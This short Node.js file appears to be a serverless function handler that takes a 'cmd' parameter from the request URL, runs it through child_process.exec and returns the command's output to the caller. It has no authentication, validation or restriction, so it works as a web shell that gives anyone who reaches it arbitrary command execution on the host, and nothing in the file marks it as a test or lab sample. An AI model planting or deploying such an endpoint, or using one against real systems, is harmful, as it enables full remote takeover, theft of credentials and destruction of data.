const util = require('util');
const exec = util.promisify(require('child_process').exec);

exports.handler = async (req) => {
  try {
    const url = new URL(req.url);
    const cmd = url.searchParams.get('cmd');
    const { stdout, stderr } = await exec(cmd);

    return {
    statusCode: 200,
    body: `stdout:
${stdout}
stderr:
${stderr}
`
  };
  } catch (err) {
    return {
      statusCode: 200,
      body: `Execution failed: ${err}`
    }
  }
};
